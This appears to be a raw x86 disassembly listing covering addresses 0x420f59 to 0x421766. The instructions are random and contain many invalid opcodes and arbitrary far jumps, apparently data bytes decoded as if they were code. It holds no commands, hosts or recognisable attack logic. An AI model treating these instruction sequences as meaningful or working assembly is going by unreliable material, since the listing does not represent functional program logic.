  420f59:	stc    
  420f5a:	cmp    edx,DWORD PTR [edi+0x13]
  420f5d:	outs   dx,BYTE PTR ds:[esi]
  420f5e:	push   0x78c7ff2b
  420f63:	dec    eax
  420f64:	sbb    eax,0xea547805
  420f69:	mov    eax,ds:0x478468cd
  420f6e:	ds pop esi
  420f70:	int3   
  420f71:	dec    ebx
  420f72:	sub    BYTE PTR [edi+0x2f10e625],0xa7
  420f79:	scas   al,BYTE PTR es:[edi]
  420f7a:	xchg   DWORD PTR [edx+0x58],eax
  420f7d:	rcl    DWORD PTR [edx],cl
  420f7f:	imul   edi,DWORD PTR [ebx],0xffffffbb
  420f82:	add    DWORD PTR [edi],0x4adc95c4
  420f88:	stc    
  420f89:	pop    esp
  420f8a:	jl     0x420f3b
  420f8c:	lds    ebp,FWORD PTR [eax+0x39068656]
  420f92:	sub    eax,0x1827c3c
  420f97:	bound  ecx,QWORD PTR [edx]
  420f99:	jns    0x421004
  420f9b:	fdiv   st,st(3)
  420f9d:	cli    
  420f9e:	call   0xce94c587
  420fa3:	and    al,0xf2
  420fa5:	lahf   
  420fa6:	xchg   BYTE PTR [eax*1-0x525a0d6e],cl
  420fad:	cmp    DWORD PTR [ebx],edx
  420faf:	test   al,0x37
  420fb1:	push   ebx
  420fb2:	iret   
  420fb3:	cmp    esi,DWORD PTR [ebx+eax*2]
  420fb6:	sub    al,ah
  420fb8:	aas    
  420fb9:	mov    bl,0xda
  420fbb:	mov    ds:0x2a616270,al
  420fc0:	not    DWORD PTR [esi-0x2e]
  420fc3:	sbb    al,0x35
  420fc5:	push   ds
  420fc6:	jp     0x421014
  420fc8:	fwait
  420fc9:	repnz jmp 0xa6a8:0xf03775a2
  420fd1:	xor    bl,BYTE PTR [esi]
  420fd3:	jnp    0x420f9f
  420fd5:	gs sbb esi,ecx
  420fd8:	imul   ecx,DWORD PTR [ebp+0x54a12557],0x2e941a0a
  420fe2:	inc    esi
  420fe3:	fwait
  420fe4:	push   edx
  420fe5:	sahf   
  420fe6:	jmp    0x420fba
  420fe8:	scas   eax,DWORD PTR es:[edi]
  420fe9:	jecxz  0x42101e
  420feb:	int3   
  420fec:	mov    WORD PTR [eax+0x67],gs
  420fef:	in     al,dx
  420ff0:	loopne 0x420fb5
  420ff2:	pop    ecx
  420ff3:	jbe    0x420fc0
  420ff5:	mov    ecx,0x790063c3
  420ffa:	mov    al,0xd5
  420ffc:	sbb    ecx,DWORD PTR ds:0x8c6ee5e0
  421002:	mov    DWORD PTR [edx],0xb3a5bbe4
  421008:	(bad)
  42100b:	into   
  42100c:	cli    
  42100d:	(bad)  
  42100e:	ret    0x108
  421011:	mov    ds:0x7f15bf45,al
  421016:	sub    DWORD PTR [ebp+0xc],edi
  421019:	loopne 0x420fe5
  42101b:	xor    DWORD PTR [eax+0x1f],edi
  42101e:	inc    ebx
  42101f:	mov    eax,0x137ddc8c
  421024:	arpl   cx,bp
  421026:	adc    BYTE PTR [edx-0x4c],al
  421029:	dec    ecx
  42102a:	cdq    
  42102b:	clc    
  42102c:	sub    ch,BYTE PTR [esi-0x7051caa1]
  421032:	xor    DWORD PTR [ecx],ebp
  421034:	and    al,0xde
  421036:	jno    0x421069
  421038:	cs sbb ch,cl
  42103b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42103c:	add    eax,0xa4b9d5ad
  421041:	xor    BYTE PTR [ebp-0x753d4e31],ah
  421047:	push   0x8c45da13
  42104c:	jbe    0x421064
  42104e:	daa    
  42104f:	inc    ebx
  421050:	add    dh,BYTE PTR [ebx+0x1a2c0b24]
  421056:	sbb    al,BYTE PTR [ebx-0x1759466f]
  42105c:	jno    0x42102a
  42105e:	adc    al,0xd4
  421060:	test   cl,ch
  421062:	icebp  
  421063:	inc    edx
  421064:	int3   
  421065:	inc    edx
  421066:	mov    eax,0x5051d98d
  42106b:	push   ebp
  42106c:	fwait
  42106d:	push   esp
  42106e:	ins    BYTE PTR es:[edi],dx
  42106f:	xchg   ebp,eax
  421070:	test   BYTE PTR [esi+0x5583785f],ch
  421076:	mov    dh,0xa
  421078:	mov    ebp,DWORD PTR [esi]
  42107a:	jae    0x421086
  42107c:	stc    
  42107d:	adc    esi,DWORD PTR [esi+0x64]
  421080:	xchg   ebx,eax
  421081:	cmp    BYTE PTR cs:[edx],cl
  421084:	xchg   esp,eax
  421085:	and    al,BYTE PTR [eax+ebp*2]
  421088:	aas    
  421089:	icebp  
  42108a:	cmp    ebx,0x4
  42108d:	push   0xffffffd4
	...
  421097:	add    BYTE PTR [eax],al
  421099:	add    BYTE PTR [edx+ecx*4-0x49],bl
  42109d:	imul   esi,edi,0x7f
  4210a0:	fdivr  QWORD PTR [edi+0x2b60ebfc]
  4210a6:	(bad)  
  4210a7:	cmp    al,0xfd
  4210a9:	clc    
  4210aa:	stc    
  4210ab:	mov    WORD PTR [ecx],es
  4210ad:	add    ch,bh
  4210af:	add    DWORD PTR [eax],eax
  4210b1:	add    BYTE PTR [edi+0x6f],bl
  4210b4:	es retf 
  4210b6:	push   cs
  4210b7:	enter  0x7590,0xec
  4210bb:	ins    DWORD PTR es:[edi],dx
  4210bc:	fst    DWORD PTR [esi]
  4210be:	dec    edi
  4210bf:	in     al,0x1f
  4210c1:	cmp    BYTE PTR [esi+0x55],ch
  4210c4:	out    0xe1,eax
  4210c6:	inc    edx
  4210c7:	jecxz  0x421091
  4210c9:	cld    
  4210ca:	and    al,0xf9
  4210cc:	xchg   ebp,eax
  4210cd:	fwait
  4210ce:	pop    ds
  4210cf:	adc    al,0x93
  4210d1:	mov    edx,0x65932be7
  4210d6:	push   0x60d00548
  4210db:	subps  xmm5,XMMWORD PTR [di]
  4210df:	nop
  4210e0:	inc    eax
  4210e1:	ss in  eax,0x2f
  4210e4:	scas   eax,DWORD PTR es:[edi]
  4210e5:	inc    edi
  4210e6:	mov    edx,0x3fb9cbe8
  4210eb:	into   
  4210ec:	arpl   WORD PTR [edi],bp
  4210ee:	jp     0x4210bb
  4210f0:	adc    al,0x9a
  4210f2:	pusha  
  4210f3:	in     eax,0x1b
  4210f5:	dec    edi
  4210f6:	adc    ch,bh
  4210f8:	(bad)  
  4210f9:	mov    bl,0x18
  4210fb:	adc    eax,0xcf36929c
  421100:	and    al,0x60
  421102:	jo     0x421167
  421104:	sbb    BYTE PTR es:[ebp+0x22],bl
  421108:	jp     0x421136
  42110a:	cmp    esi,DWORD PTR [eax+0x3a]
  42110d:	mov    BYTE PTR [ebp+0x7e],0xce
  421111:	pop    es
  421112:	into   
  421113:	or     BYTE PTR [ebp-0x5],ch
  421116:	sti    
  421117:	jp     0x4210f3
  421119:	xchg   edx,eax
  42111a:	mov    eax,0x349699bc
  42111f:	cs push 0x4a75f042
  421125:	sbb    dl,BYTE PTR [ebx+0x1ff3cc57]
  42112b:	test   BYTE PTR [ebp-0x7c3112fd],ah
  421131:	ror    BYTE PTR [edx+edx*8-0x12],1
  421135:	sub    eax,0x4674e9bd
  42113a:	sub    eax,0x958eea98
  42113f:	cld    
  421140:	xor    BYTE PTR [edi-0x51],dh
  421143:	pop    edi
  421144:	out    0x81,al
  421146:	into   
  421147:	mov    DWORD PTR [esi-0x13ac65ff],ebx
  42114d:	gs inc esi
  42114f:	(bad)  
  421150:	aas    
  421151:	push   es
  421152:	fisubr DWORD PTR [esp+ebx*8-0x2e0b41ee]
  421159:	xlat   BYTE PTR ds:[ebx]
  42115a:	int3   
  42115b:	out    0x70,eax
  42115d:	int    0x5
  42115f:	mov    eax,0x124a806e
  421164:	outs   dx,DWORD PTR ds:[esi]
  421165:	mov    DWORD PTR [edi+0x2fbd9206],edi
  42116b:	push   edx
  42116c:	sbb    eax,0xa57a97dd
  421171:	sub    BYTE PTR ds:0x5d7f60c,al
  421177:	icebp  
  421178:	lock enter 0x366b,0xc1
  42117d:	dec    ecx
  42117e:	dec    esi
  42117f:	arpl   WORD PTR [ebp+0x3b],cx
  421182:	mov    DWORD PTR [eax-0x50],edx
  421185:	jno    0x421137
  421187:	std    
  421188:	dec    ecx
  421189:	popa   
  42118a:	and    esi,edi
  42118c:	jno    0x421167
  42118e:	adc    DWORD PTR [ecx-0x7b1e8471],esp
  421194:	repnz hlt 
  421196:	fiadd  WORD PTR [eax-0x2f]
  421199:	dec    edi
  42119a:	(bad)  
  42119b:	cmp    eax,DWORD PTR [edi-0x2a8e32f]
  4211a1:	cdq    
  4211a2:	fdivr  QWORD PTR [ecx-0x56]
  4211a5:	jle    0x421189
  4211a7:	fnstsw WORD PTR [esi-0x49]
  4211aa:	nop
  4211ab:	lods   al,BYTE PTR ds:[esi]
  4211ac:	cmp    BYTE PTR [edi+0x45],dl
  4211af:	sub    cl,BYTE PTR [eax+ebx*1-0x4e]
  4211b3:	inc    esi
  4211b4:	cmp    dh,BYTE PTR [ebp+0x50]
  4211b7:	jl     0x42120a
  4211b9:	jle    0x42117e
  4211bb:	sahf   
  4211bc:	dec    esp
  4211bd:	icebp  
  4211be:	pop    edx
  4211bf:	add    ah,BYTE PTR [ecx+0x3a]
  4211c2:	mov    bl,0xe1
  4211c4:	fisttp QWORD PTR cs:[edx]
  4211c7:	aas    
  4211c8:	or     al,BYTE PTR [ebp+0x7]
  4211cb:	inc    edi
  4211cc:	daa    
  4211cd:	in     eax,0x7b
  4211cf:	pop    ss
  4211d0:	int    0x9e
  4211d2:	push   esp
  4211d3:	lock shr BYTE PTR [ebp-0x7410e156],0xd6
  4211db:	xor    DWORD PTR ds:[ebp+0x41],0xffffff92
  4211e0:	add    al,0xce
  4211e2:	push   eax
  4211e3:	jns    0x421212
  4211e5:	scas   al,BYTE PTR es:[edi]
  4211e6:	aas    
  4211e7:	push   ecx
  4211e8:	loope  0x421227
  4211ea:	dec    ecx
  4211eb:	call   0x55d3:0x78cb1486
  4211f2:	add    BYTE PTR [ebx],dh
  4211f4:	test   dl,bl
  4211f6:	and    eax,0xd5f994ad
  4211fb:	mov    ebp,0xa2345510
  421200:	xchg   esi,eax
  421201:	adc    DWORD PTR ds:0x2dae546,ecx
  421207:	in     al,0x77
  421209:	inc    ebx
  42120a:	cwde   
  42120b:	sbb    edi,ebx
  42120d:	in     eax,0xa3
  42120f:	sub    eax,0x57c4305d
  421214:	dec    eax
  421215:	div    edx
  421217:	jl     0x4211c3
  421219:	call   0x1661:0x40324992
  421220:	or     al,0xb2
  421222:	xchg   ebx,eax
  421223:	sub    DWORD PTR [ebp+0x10],0x389410c7
  42122a:	aam    0x57
  42122c:	mov    ah,0xe6
  42122e:	mov    ch,0x12
  421230:	push   ebx
  421231:	push   cs
  421232:	pop    edx
  421233:	lea    ecx,[edi-0x2f]
  421236:	xchg   cl,al
  421238:	ret    0x5bc6
  42123b:	scas   eax,DWORD PTR es:[edi]
  42123c:	cmp    al,0xb7
  42123e:	push   esi
  42123f:	call   0x6cf9:0xe1051ace
  421246:	mov    ebp,0xfb32614b
  42124b:	fwait
  42124c:	dec    ebp
  42124d:	iret   
  42124e:	mov    ah,0x9a
  421250:	push   esi
  421251:	xor    DWORD PTR [ebx+ebp*1+0x12ea2075],0xc2296e3c
  42125c:	sbb    dh,BYTE PTR [ebp+0x2d591347]
  421262:	lea    ebp,[ebp+0x557ee38e]
  421268:	inc    ebp
  421269:	loop   0x421239
  42126b:	xlat   BYTE PTR ds:[ebx]
  42126c:	add    esi,ecx
  42126e:	xchg   ecx,eax
  42126f:	jp     0x42127f
  421271:	cli    
  421272:	daa    
  421273:	add    esp,DWORD PTR [ecx]
  421275:	add    DWORD PTR ds:0x3739790b,0xfffffff1
  42127c:	or     DWORD PTR [ebx+0x2e],ebp
  42127f:	sbb    BYTE PTR [ecx],al
  421281:	add    al,0xb1
  421283:	sti    
  421284:	dec    DWORD PTR [eax]
  421286:	mov    DWORD PTR [eax],edx
  421288:	jl     0x421254
  42128a:	cli    
  42128b:	mov    edx,0xad47ab94
  421290:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421291:	in     al,dx
  421292:	jns    0x4212dc
  421294:	xchg   esp,eax
  421295:	call   0x7aed5488
  42129a:	adc    al,0x7f
  42129c:	jmp    0x5041:0x18d4b63c
  4212a3:	test   al,0x3
  4212a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212a6:	xchg   edx,eax
  4212a7:	mov    ?,WORD PTR [ebx+edx*8]
  4212aa:	sub    esp,DWORD PTR [edx+0x47]
  4212ad:	push   0x56
	...
  4212ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212bb:	sbb    al,BYTE PTR [edi-0x204026]
  4212c1:	jg     0x42132a
  4212c3:	pop    esp
  4212c4:	fstp   DWORD PTR [ecx+0x5d6b3ab4]
  4212ca:	test   BYTE PTR [esi+0x1fd0001],0x0
  4212d1:	add    BYTE PTR [ebx-0x189c79c2],bh
  4212d7:	mov    BYTE PTR [ebx+0x2d],al
  4212da:	shl    al,1
  4212dc:	loope  0x42135c
  4212de:	push   ds
  4212df:	fstp   QWORD PTR [eax+0x3188238a]
  4212e5:	ror    BYTE PTR [ebx],cl
  4212e7:	imul   ecx,esp,0x52
  4212ea:	stos   DWORD PTR es:[edi],eax
  4212eb:	mov    ds:0x9bdfe377,eax
  4212f0:	fst    QWORD PTR [ebx+0x617c9220]
  4212f6:	jecxz  0x4212d3
  4212f8:	xor    al,0x23
  4212fa:	aad    0x43
  4212fc:	sub    al,0xf5
  4212fe:	ins    DWORD PTR es:[edi],dx
  4212ff:	push   ebx
  421300:	push   edx
  421301:	repz in al,0xa4
  421304:	mov    al,ds:0x73f53949
  421309:	loop   0x421329
  42130b:	idiv   ch
  42130d:	and    ebp,DWORD PTR [edi+0x4]
  421310:	fs stos BYTE PTR es:[edi],al
  421312:	in     al,dx
  421313:	out    dx,eax
  421314:	mov    ebx,0xbfa2a468
  421319:	out    dx,al
  42131a:	mov    ecx,0xc6ae6b21
  42131f:	outs   dx,BYTE PTR ds:[esi]
  421320:	cdq    
  421321:	inc    edi
  421322:	jne    0x4212e8
  421324:	mov    esp,0xe5958c6f
  421329:	imul   edi,DWORD PTR [esi-0x75e66662],0x60
  421330:	scas   eax,DWORD PTR es:[edi]
  421331:	je     0x42136c
  421333:	hlt    
  421334:	lea    edi,[ebp+0x6bf8fd44]
  42133a:	aaa    
  42133b:	mov    WORD PTR [ecx-0x61a059ed],ds
  421341:	jmp    0x53ed6918
  421346:	aad    0x55
  421348:	cwde   
  421349:	pop    esp
  42134a:	sbb    eax,0xed4d184c
  42134f:	mov    esi,0x6c93e300
  421354:	call   0xf06bf24f
  421359:	pop    ebx
  42135a:	jge    0x421305
  42135c:	nop
  42135d:	adc    ebp,eax
  42135f:	shl    BYTE PTR [eax],0x3
  421362:	dec    esi
  421363:	imul   DWORD PTR [ebp-0x32]
  421366:	pop    eax
  421367:	cmp    eax,0x600c7d43
  42136c:	int    0x52
  42136e:	sub    dh,BYTE PTR [ecx-0x7f]
  421371:	dec    esp
  421372:	push   cs
  421373:	push   0x31
  421375:	aaa    
  421376:	push   ss
  421377:	mov    dh,0x9b
  421379:	jb     0x4213df
  42137b:	pop    eax
  42137c:	xchg   ecx,esi
  42137e:	les    esi,FWORD PTR [ebx]
  421380:	fild   DWORD PTR [edx]
  421382:	gs leave 
  421384:	cmc    
  421385:	inc    esp
  421386:	pop    ds
  421387:	and    al,BYTE PTR [edi]
  421389:	aad    0x4f
  42138b:	push   esp
  42138c:	add    BYTE PTR [ebp+0x16],0xe8
  421390:	je     0x42133c
  421392:	repz aas 
  421394:	test   al,0xd3
  421396:	adc    DWORD PTR [ebp-0x4],ebx
  421399:	and    dh,BYTE PTR [edi-0x2fad3ace]
  42139f:	mov    ch,0xc6
  4213a1:	xchg   BYTE PTR [ebp+0x7b7e51dc],dl
  4213a7:	jge    0x4213cc
  4213a9:	mov    eax,ds:0x6d5c43f1
  4213ae:	js     0x421342
  4213b0:	add    eax,0x6930303c
  4213b5:	pop    edi
  4213b6:	pop    ebp
  4213b7:	cdq    
  4213b8:	jecxz  0x421391
  4213ba:	in     eax,0x3d
  4213bc:	mov    ch,0x64
  4213be:	fmul   DWORD PTR [edi+0xf]
  4213c1:	xor    eax,0x6f45d1f6
  4213c6:	sub    BYTE PTR [ebp+0x76],cl
  4213c9:	rcr    DWORD PTR [eax],cl
  4213cb:	sbb    DWORD PTR [edx+0x1f],eax
  4213ce:	mov    edi,0x9d14f8ca
  4213d3:	mov    edx,0xc55f21b
  4213d8:	inc    ebx
  4213d9:	loopne 0x42136c
  4213db:	jne    0x4213d0
  4213dd:	test   al,0x26
  4213df:	sbb    ebp,DWORD PTR es:[edi-0x26]
  4213e3:	iret   
  4213e4:	adc    dl,bl
  4213e6:	jne    0x4213b0
  4213e8:	cs cmc 
  4213ea:	popa   
  4213eb:	mov    WORD PTR [edi+0x47],es
  4213ee:	add    bh,bl
  4213f0:	retf   0xb14e
  4213f3:	sar    DWORD PTR [edx-0x20481145],1
  4213f9:	daa    
  4213fa:	cdq    
  4213fb:	lods   eax,DWORD PTR ds:[esi]
  4213fc:	sub    al,0xb1
  4213fe:	aad    0x5
  421400:	dec    edx
  421401:	lds    edi,FWORD PTR es:[ebx]
  421404:	add    edi,eax
  421406:	test   BYTE PTR [edx],dh
  421408:	imul   ebx,DWORD PTR [edx-0x1dc893cf],0x9b201394
  421412:	inc    eax
  421413:	into   
  421414:	das    
  421415:	aaa    
  421416:	push   edi
  421417:	jns    0x421472
  421419:	lock test edi,ebp
  42141c:	or     ebp,0x381cd164
  421422:	adc    eax,0xdefe2488
  421427:	aam    0xc6
  421429:	dec    ecx
  42142a:	add    BYTE PTR [edx+0x1c123835],bl
  421430:	lahf   
  421431:	(bad)  [ebp+0x21]
  421434:	xchg   ecx,eax
  421435:	cdq    
  421436:	push   ds
  421437:	aas    
  421438:	mov    al,ds:0x6da9ba1d
  42143d:	dec    edi
  42143e:	cli    
  42143f:	(bad)  
  421441:	ins    DWORD PTR es:[edi],dx
  421442:	aaa    
  421443:	pop    ebx
  421444:	(bad)  
  421445:	cmc    
  421446:	push   esp
  421447:	ret    
  421448:	mov    eax,ds:0x1ce50c35
  42144d:	mov    esi,0xa3749719
  421452:	sub    DWORD PTR [eax],eax
  421454:	xchg   edx,eax
  421455:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421456:	pop    esi
  421457:	pop    es
  421458:	pop    ss
  421459:	sbb    al,0x26
  42145b:	rcl    DWORD PTR [edi+0x69bb2bde],cl
  421461:	(bad)  [edx]
  421463:	out    dx,eax
  421464:	add    BYTE PTR [ebx],0x91
  421467:	fwait
  421468:	add    eax,0x22efd54e
  42146d:	or     BYTE PTR [esi-0x65],ch
  421470:	sub    edi,edi
  421472:	loope  0x421412
  421474:	retf   
  421475:	js     0x421444
  421477:	fmul   st(7),st
  421479:	(bad)  
  42147a:	fwait
  42147b:	push   ss
  42147c:	fstp   QWORD PTR [ebx-0x2848532e]
  421482:	js     0x42149e
  421484:	push   ds
  421485:	shr    BYTE PTR ds:0x676d9dd6,1
  42148b:	les    edx,FWORD PTR [ecx-0x1394e2ba]
  421491:	ret    
  421492:	push   ds
  421493:	fistp  WORD PTR [ecx]
  421495:	movntps XMMWORD PTR [ebp+0x2c190f29],xmm6
  42149c:	cwde   
  42149d:	pop    ecx
  42149e:	and    al,0x89
  4214a0:	adc    BYTE PTR [edx+0x73],dh
  4214a3:	xchg   DWORD PTR [edi-0x29d7e9fa],ebx
  4214a9:	addr16 aam 0xd8
  4214ac:	xchg   esp,eax
  4214ad:	mov    ds:0x458d1f9d,al
  4214b2:	jb     0x421478
  4214b4:	(bad)  [edi-0x79]
  4214b7:	cmp    DWORD PTR [esi],edi
  4214b9:	popf   
  4214ba:	cli    
  4214bb:	push   edi
  4214bc:	stc    
  4214bd:	sub    al,0x95
  4214bf:	lods   al,BYTE PTR ds:[esi]
  4214c0:	xchg   ebp,eax
  4214c1:	mov    BYTE PTR [ebp+0x2b],dh
  4214c4:	retf   0xe239
  4214c7:	es pop ebx
  4214c9:	add    esp,ecx
  4214cb:	mov    edx,0xb037f0
	...
  4214d8:	add    BYTE PTR [eax],al
  4214da:	popf   
  4214db:	paddd  mm4,QWORD PTR [esi+edi*8-0x5bc0200b]
  4214e3:	fidiv  DWORD PTR [ebp+0x34]
  4214e6:	stos   BYTE PTR es:[edi],al
  4214e7:	mov    bh,0xa4
  4214e9:	shl    bl,cl
  4214eb:	nop
  4214ec:	add    DWORD PTR [eax],eax
  4214ee:	std    
  4214ef:	add    DWORD PTR [eax],eax
  4214f1:	add    BYTE PTR [ebp+0x6522b3fc],bl
  4214f7:	add    al,0xf8
  4214f9:	int3   
  4214fa:	mov    eax,0x590ee76c
  4214ff:	xchg   BYTE PTR [edx-0x5d],cl
  421502:	hlt    
  421503:	test   ah,al
  421505:	add    ah,0xc5
  421508:	fidiv  DWORD PTR [ecx]
  42150a:	in     al,0x6a
  42150c:	jle    0x4214e7
  42150e:	pandn  mm6,QWORD PTR [ecx+0x5a]
  421512:	add    eax,0x99aa2d53
  421517:	scas   al,BYTE PTR es:[edi]
  421518:	jmp    0x1330:0x21d8f6b8
  42151f:	test   al,0x94
  421521:	and    BYTE PTR [esi-0x30329217],dl
  421527:	mov    BYTE PTR [ebx+ebx*8+0x3ae70ff5],bl
  42152e:	pop    edi
  42152f:	cld    
  421530:	mov    bh,0xef
  421532:	jno    0x421512
  421534:	lods   eax,DWORD PTR ds:[esi]
  421535:	or     ch,dh
  421537:	aad    0xc0
  421539:	neg    BYTE PTR [eax]
  42153b:	mov    bh,BYTE PTR [edx]
  42153d:	js     0x42152b
  42153f:	test   BYTE PTR [ebx+ebx*1-0x56c98697],bh
  421546:	mov    ch,0x41
  421548:	in     al,dx
  421549:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42154a:	xchg   esi,eax
  42154b:	outs   dx,BYTE PTR ds:[esi]
  42154c:	mov    al,0x7e
  42154e:	fadd   QWORD PTR [ebx]
  421550:	lea    eax,[eax]
  421552:	icebp  
  421553:	mov    dl,0xf4
  421555:	repz xchg edi,eax
  421557:	fiadd  DWORD PTR [edx]
  421559:	retf   
  42155a:	js     0x4215d2
  42155c:	cli    
  42155d:	sub    BYTE PTR [edi+0x5a7473f2],ch
  421563:	jnp    0x4215b1
  421565:	adc    ah,BYTE PTR [edx+0x1c6762db]
  42156b:	(bad)  
  42156d:	xor    al,0x29
  42156f:	and    BYTE PTR [edx-0x38],0xf7
  421573:	repz sub eax,0xcea85a45
  421579:	rcr    DWORD PTR [eax+0x463044ab],0x93
  421580:	test   eax,0x71383514
  421585:	jns    0x4215fb
  421587:	(bad)  
  421589:	add    DWORD PTR [ecx],ebp
  42158b:	aad    0xfa
  42158d:	sub    eax,0xbe104005
  421592:	push   0xa8b507dc
  421597:	out    0xf0,eax
  421599:	jle    0x42157c
  42159b:	xchg   edx,eax
  42159c:	ins    BYTE PTR es:[edi],dx
  42159d:	xchg   edx,ebx
  42159f:	jmp    0x737b:0xcdf12323
  4215a6:	cdq    
  4215a7:	pop    esi
  4215a8:	mov    eax,0x82016c42
  4215ad:	xchg   ebx,eax
  4215ae:	call   0xf4b421af
  4215b3:	pop    ds
  4215b4:	mov    edi,0xaf4f9ed5
  4215b9:	stos   DWORD PTR es:[edi],eax
  4215ba:	push   edx
  4215bb:	rol    DWORD PTR [edi],cl
  4215bd:	mov    BYTE PTR [ebp-0x636f2ef6],cl
  4215c3:	ins    BYTE PTR es:[edi],dx
  4215c4:	xchg   ebx,eax
  4215c5:	ror    BYTE PTR [eax-0x6738abbc],1
  4215cb:	adc    DWORD PTR [esp+edi*2-0x45],edi
  4215cf:	push   es
  4215d0:	inc    esi
  4215d1:	xchg   BYTE PTR [edi-0x511ad322],dh
  4215d7:	push   edi
  4215d8:	pop    ebp
  4215d9:	out    0xac,al
  4215db:	sbb    esp,DWORD PTR [eax+0x596a68d9]
  4215e1:	shr    BYTE PTR [edi],1
  4215e3:	loop   0x42159d
  4215e5:	push   ebx
  4215e6:	adc    ah,BYTE PTR [eax-0x7debea91]
  4215ec:	cdq    
  4215ed:	sub    ch,BYTE PTR [esi-0x4f308401]
  4215f3:	ss test esi,edx
  4215f6:	or     bl,BYTE PTR [esi+eax*1-0x7d]
  4215fa:	test   eax,0x266bc1f9
  4215ff:	js     0x42159e
  421601:	adc    al,ah
  421603:	or     DWORD PTR [esi-0x4aedb10b],0x18
  42160a:	sub    ebp,DWORD PTR [edx]
  42160c:	or     DWORD PTR [edx],esi
  42160e:	outs   dx,DWORD PTR ds:[esi]
  42160f:	dec    ebx
  421610:	call   0xbc2b:0x2b1bc82b
  421617:	or     DWORD PTR [ebp+0x63671652],ecx
  42161d:	cli    
  42161e:	mov    al,dl
  421620:	aam    0x84
  421622:	adc    ebp,esp
  421624:	xchg   esi,eax
  421625:	push   0x55
  421627:	add    al,0x5e
  421629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42162a:	call   0xb5362cb3
  42162f:	in     eax,dx
  421630:	test   al,0x48
  421632:	xchg   DWORD PTR [edx],esi
  421634:	repnz push 0xffffffab
  421637:	rol    DWORD PTR [ebp-0x2d],0x66
  42163b:	pop    ss
  42163c:	xchg   edi,eax
  42163d:	and    DWORD PTR [esi-0x42fec743],0xffffffe9
  421644:	ja     0x42161c
  421646:	pop    ebx
  421647:	dec    edx
  421648:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421649:	push   ss
  42164a:	add    BYTE PTR [esi-0x4a],bh
  42164d:	sti    
  42164e:	push   esp
  42164f:	out    dx,eax
  421650:	scas   eax,DWORD PTR es:[edi]
  421651:	and    al,0xf2
  421653:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421654:	scas   al,BYTE PTR es:[edi]
  421655:	mov    ds:0xf77da018,al
  42165a:	(bad)  
  42165b:	mul    BYTE PTR [ecx-0x50]
  42165e:	sbb    BYTE PTR [ebx-0x3b],al
  421661:	test   eax,0x86013728
  421666:	mov    ah,0x16
  421668:	sbb    BYTE PTR [ebx],0x87
  42166b:	sub    bl,BYTE PTR [eax-0x4d2ee33c]
  421671:	inc    esp
  421672:	inc    ebx
  421673:	(bad)  
  421674:	scas   eax,DWORD PTR es:[edi]
  421675:	xchg   ecx,eax
  421676:	add    DWORD PTR [ebx+0x537b137f],ebx
  42167c:	sar    BYTE PTR [edi],1
  42167e:	mov    DWORD PTR [esp+eiz*4],ecx
  421681:	out    0x43,eax
  421683:	jno    0x42160b
  421685:	jb     0x4216e5
  421687:	cmp    eax,0x24a12756
  42168c:	bound  edx,QWORD PTR [edi+ecx*1]
  42168f:	fild   WORD PTR [edx+ecx*1-0x70f35ab0]
  421696:	xchg   edi,eax
  421697:	xchg   ebx,eax
  421698:	push   cs
  421699:	int3   
  42169a:	mov    edx,0xd198e613
  42169f:	xchg   esi,eax
  4216a0:	into   
  4216a1:	sbb    esp,DWORD PTR [esi-0x1f]
  4216a4:	scas   al,BYTE PTR es:[edi]
  4216a5:	or     BYTE PTR [eax-0x1f8728e2],ah
  4216ab:	xchg   esp,eax
  4216ac:	push   0x6767ae23
  4216b1:	pop    ebx
  4216b2:	jbe    0x421643
  4216b4:	sub    esp,edx
  4216b6:	imul   eax,DWORD PTR [ebx+edi*2+0x3225a70f],0x19
  4216be:	(bad)  
  4216bf:	test   al,0x7
  4216c1:	leave  
  4216c2:	jae    0x42164a
  4216c4:	pop    edx
  4216c5:	cmp    eax,0xfe650bc6
  4216ca:	out    dx,eax
  4216cb:	xchg   esp,eax
  4216cc:	cld    
  4216cd:	adc    esi,esi
  4216cf:	lds    edi,FWORD PTR [ecx+esi*1-0x506f5183]
  4216d6:	jge    0x421671
  4216d8:	sbb    DWORD PTR [eax-0x4e],ecx
  4216db:	mov    ds:0x5374f94,al
  4216e0:	and    bl,BYTE PTR [ebx-0x7e]
  4216e3:	js     0x42169d
  4216e5:	add    BYTE PTR [ebx-0x60df6aec],0xc9
  4216ec:	dec    esp
  4216ed:	push   0xab
	...
  4216fa:	and    BYTE PTR [esi],dl
  4216fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216fd:	lea    esi,[esi+0x44bf29bf]
  421703:	sub    esp,esi
  421705:	mul    bl
  421707:	mov    esi,0x92f0445c
  42170c:	add    DWORD PTR [eax],eax
  42170e:	std    
  42170f:	add    DWORD PTR [eax],eax
  421711:	add    BYTE PTR [eax-0x1c],bh
  421714:	push   edx
  421715:	inc    ecx
  421716:	(bad)  
  421717:	jge    0x42175d
  421719:	sbb    esp,esp
  42171b:	shl    ebx,0x4d
  42171e:	and    DWORD PTR [edi-0x38],ebp
  421721:	jp     0x421780
  421723:	pop    eax
  421724:	xchg   ebp,eax
  421725:	das    
  421726:	xchg   esi,eax
  421727:	daa    
  421728:	(bad)  
  421729:	mov    dh,0x57
  42172b:	repz fistp WORD PTR [eax]
  42172e:	mov    ebx,0x94f3b2d
  421733:	and    eax,0xa609b9ba
  421738:	jbe    0x421735
  42173a:	and    ah,BYTE PTR [edi-0x26]
  42173d:	nop
  42173e:	retf   
  42173f:	add    eax,DWORD PTR [edi]
  421741:	stos   BYTE PTR es:[edi],al
  421742:	cmp    eax,0x43f26a80
  421747:	mov    edx,DWORD PTR [ecx]
  421749:	and    al,0xb9
  42174b:	neg    dl
  42174d:	pusha  
  42174e:	jnp    0x4216ed
  421750:	add    BYTE PTR [esi+0x2cab78cb],ch
  421756:	xchg   DWORD PTR [edi],ebx
  421758:	jl     0x4216e1
  42175a:	cmp    edi,esp
  42175c:	fmul   DWORD PTR [eax-0x385b39bf]
  421762:	sar    BYTE PTR [esi+0x0],1
  421765:	dec    edi
  421766:	test   DWORD PTR [esi+0x54],edi
